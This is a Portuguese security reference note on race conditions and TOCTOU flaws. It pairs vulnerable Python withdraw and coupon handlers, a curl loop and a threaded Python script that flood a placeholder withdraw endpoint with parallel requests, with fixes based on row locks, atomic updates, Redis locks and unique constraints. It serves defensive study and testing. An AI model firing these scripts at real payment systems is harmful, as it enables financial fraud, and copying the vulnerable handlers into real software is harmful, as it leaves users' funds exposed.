# Race Condition & TOCTOU

**Tags:** #alto #race-condition #toctou #concorrencia #transacao
**OWASP:** A04:2021 — Insecure Design
**CVSS Base:** 8.1 (Alto — fraude financeira, privilege escalation)

---

## 📖 O que é

**Race Condition:** o sistema verifica uma condição num momento e age baseado nela num momento posterior. No intervalo entre os dois, um atacante viola a premissa.

**TOCTOU (Time of Check / Time of Use):** o nome técnico do padrão — o "check" (verificação) e o "use" (ação) estão separados no tempo sem proteção.

---

## 🔍 `grep_search` Táticas

```
beginTransaction
lock
mutex
SELECT FOR UPDATE
FOR UPDATE
LOCK IN SHARE MODE
.lock()
synchronized
Lock()
threading.Lock
asyncio.Lock
```

**A AUSÊNCIA** desses termos em fluxos críticos é o **sinal de alerta**.

---

## 🎯 Contextos de Alto Risco

| Funcionalidade | Risco |
|---|---|
| Sistema de cupom/voucher | Usar o mesmo cupom múltiplas vezes |
| Saques/transferências | Sacar mais que o saldo disponível |
| Limite de tentativas de login | Contornar rate limiting |
| Geração de tokens únicos | Gerar duplicatas |
| Limit de compras ("1 por usuário") | Comprar múltiplos |
| Aprovação de transações | Dupla aprovação |
| Criação de conta | Duplicar usuário com mesmo email |

---

## 💣 Exemplo de Exploit

### Saque em Excesso (o exemplo clássico)

```python
# ❌ VULNERÁVEL — padrão verificar → agir sem lock transacional
@app.post('/withdraw')
@login_required
def withdraw():
    amount = request.json['amount']
    user = User.query.get(current_user.id)
    
    # CHECK: verificar saldo
    if user.balance < amount:
        return jsonify({"error": "Saldo insuficiente"}), 400
    
    # ← JANELA DE EXPLORAÇÃO: 50 requisições paralelas chegam aqui
    #   Todas passaram no check com saldo R$100
    
    # USE: debitar
    user.balance -= amount
    db.session.commit()
    # → 50 saques de R$100 com saldo inicial de R$100 = -R$4900
```

**Ferramenta de teste:**
```bash
# Enviar 50 requisições simultâneas com curl
for i in {1..50}; do
    curl -s -X POST http://target.com/withdraw \
         -H "Authorization: Bearer $TOKEN" \
         -H "Content-Type: application/json" \
         -d '{"amount": 100}' &
done
wait
```

---

### Cupom Reutilizável por Race Condition

```python
# ❌ VULNERÁVEL
def apply_coupon(code: str, user_id: int):
    coupon = Coupon.objects.get(code=code)
    
    # CHECK: cupom não foi usado por este usuário?
    if CouponUsage.objects.filter(coupon=coupon, user_id=user_id).exists():
        return "Cupom já utilizado"
    
    # ← JANELA: 20 requisições simultâneas passaram pelo check
    
    # USE: registrar uso e aplicar desconto
    CouponUsage.objects.create(coupon=coupon, user_id=user_id)
    apply_discount(user_id, coupon.discount)
```

---

## ✅ Correção por Padrão

### Database Lock (SELECT FOR UPDATE)

```python
# ✅ CORRETO — transação com lock de linha
from django.db import transaction

@transaction.atomic
def withdraw(user_id, amount):
    # SELECT FOR UPDATE: trava a linha até o commit
    user = User.objects.select_for_update().get(id=user_id)
    
    if user.balance < amount:
        raise ValueError("Saldo insuficiente")
    
    user.balance -= amount
    user.save()
    # Lock liberado aqui quando a transação comita
```

```python
# ✅ SQLAlchemy
with db.session.begin():
    user = db.session.query(User).with_for_update().filter_by(id=user_id).one()
    if user.balance < amount:
        raise ValueError("Saldo insuficiente")
    user.balance -= amount
```

### Operação Atômica no Banco

```sql
-- ✅ UPDATE atômico — sem janela de exploração
UPDATE accounts 
SET balance = balance - 100
WHERE user_id = 42 AND balance >= 100;
-- Se 0 rows afetadas → saldo insuficiente (sem race)
```

```python
# ✅ Django ORM com F() — operação atômica
from django.db.models import F
rows = User.objects.filter(id=user_id, balance__gte=amount).update(
    balance=F('balance') - amount
)
if rows == 0:
    raise ValueError("Saldo insuficiente")
```

### Redis + Lua Script (Atômico)

```python
# ✅ Redis como lock distribuído
import redis

r = redis.Redis()
lock_key = f"lock:withdraw:{user_id}"
lock_timeout = 5  # segundos

# SETNX = set if not exists — atômico
with r.lock(lock_key, timeout=lock_timeout):
    # Operação protegida
    update_balance(user_id, amount)
```

### Para Cupons: INSERT com constraint UNIQUE

```sql
-- ✅ Constraint no banco previne race condition
CREATE UNIQUE INDEX unique_coupon_usage 
ON coupon_usages(coupon_id, user_id);

-- O banco rejeita o segundo INSERT automaticamente,
-- independente da velocidade das requisições
```

---

## 🧪 Script de Teste de Race Condition

```python
# .tmp/test_race_condition.py
import requests
import threading
import time

TARGET = "http://target.com"
TOKEN  = "eyJ..."
ENDPOINT = "/api/withdraw"
AMOUNT = 100        # Saldo inicial: R$100
THREADS = 20        # Enviar 20 saques simultâneos

results = []

def make_request():
    r = requests.post(
        f"{TARGET}{ENDPOINT}",
        json={"amount": AMOUNT},
        headers={"Authorization": f"Bearer {TOKEN}"},
        timeout=10
    )
    results.append(r.status_code)

# Criar threads
threads = [threading.Thread(target=make_request) for _ in range(THREADS)]

# Disparar todas simultaneamente
start = time.time()
for t in threads:
    t.start()
for t in threads:
    t.join()
end = time.time()

print(f"\n=== Race Condition Test ===")
print(f"Threads: {THREADS} | Tempo: {end-start:.2f}s")
success = results.count(200)
print(f"Requests com sucesso (200): {success}/{THREADS}")
if success > 1:
    print(f"[VULN] Race Condition confirmada! {success} saques de R${AMOUNT} com saldo inicial R${AMOUNT}")
    print(f"       Prejuízo total possível: R${(success-1) * AMOUNT}")
else:
    print("[OK] Apenas 1 saque bem-sucedido — possível proteção")
```

---

## 🔗 Chain Exploits

```
Race Condition em saque → Saldo negativo infinito → Fraud financeira
Race Condition em cupom → 100% desconto em todas as compras
Race Condition em limite de API → DDoS de funcionalidade pagada
Race Condition em geração de token único → Colisão de tokens → Account Takeover
TOCTOU em verificação de arquivo → write antes do check → Privilege Escalation
```

---

## 📌 Referências
- [[Business Logic Flaws]]
- [[IDOR & BOLA — Broken Object Level Authorization]]
- [PortSwigger Race Conditions](https://portswigger.net/web-security/race-conditions)
